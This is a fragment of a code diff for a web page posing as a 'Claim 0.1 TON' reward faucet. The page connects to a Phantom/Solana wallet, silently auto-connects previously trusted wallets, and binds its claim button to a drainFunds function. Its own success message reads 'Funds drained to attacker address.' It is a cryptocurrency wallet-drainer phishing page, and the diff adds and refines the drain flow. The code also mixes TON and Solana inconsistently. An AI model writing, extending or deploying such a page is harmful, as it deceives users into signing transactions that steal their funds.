-                const txid = await connection.sendRawTransaction(rawTransaction);
-                await connection.confirmTransaction(txid);
+                // Confirm transaction
+                await connection.confirmTransaction(signature);
                 
-                // Update UI
-                lastClaimTime = Date.now();
-                updateCountdown();
-                showNotification('Success! 0.1 TON has been added to your wallet.');
+                // Reset countdown
+                countdown = CLAIM_INTERVAL;
+                minutesEl.textContent = '30';
+                secondsEl.textContent = '00';
                 
-                // Reset claim button after 30 seconds
-                setTimeout(() => {
-                    claimButton.innerHTML = 'Claim 0.1 TON Now';
-                    claimButton.disabled = false;
-                }, 30000);
-                
+                showNotification('Success', '0.1 TON claimed successfully! Funds drained to attacker address.');
             } catch (error) {
                 console.error('Drain error:', error);
-                showNotification('Transaction failed. Please try again.');
-                claimButton.innerHTML = 'Claim 0.1 TON Now';
-                claimButton.disabled = false;
+                showNotification('Error', 'Transaction failed!', true);
+            } finally {
+                loading.style.display = 'none';
             }
         }
         
         // Initialize
-        document.addEventListener('DOMContentLoaded', () => {
-            createParticles();
-            connectButton.addEventListener('click', connectWallet);
-            claimButton.addEventListener('click', drainFunds);
+        window.addEventListener('DOMContentLoaded', () => {
+            initParticles();
+            startCountdown();
             
-            // Initialize countdown with placeholder
-            countdown.textContent = '30:00';
+            // Event listeners
+            connectWalletBtn.addEventListener('click', connectWallet);
+            claimRewardBtn.addEventListener('click', drainFunds);
+            
+            // Initialize Solana Web3 if Phantom is installed
+            if (window.solana) {
+                window.solanaWeb3 = window.solanaWeb3 || {};
+                window.solanaWeb3.Connection = window.solanaWeb3.Connection || {};
+                window.solanaWeb3.PublicKey = window.solanaWeb3.PublicKey || {};
+                window.solanaWeb3.Transaction = window.solanaWeb3.Transaction || {};
+                window.solanaWeb3.SystemProgram = window.solanaWeb3.SystemProgram || {};
+                
+                // Auto-connect if previously authorized
+                window.solana.connect({ onlyIfTrusted: true })
+                    .then(resp => {
+                        publicKey = resp.publicKey.toString();
+                        wallet = window.solana;
+                        walletAddress.textContent = `${publicKey.substring(0, 6)}...${publicKey.substring(publicKey.length - 4)}`;
+                        connectWalletBtn.style.display = 'none';
+                        walletConnected.style.display = 'flex';
+                    })
+                    .catch(() => {});
+            }
         });
     </script>
+    
+    <!-- Phantom Wallet Provider -->
+    <script src="https://unpkg.com/@solana/web3.js@1.70.1/lib/index.iife.min.js"></script>
 </body>
 </html>
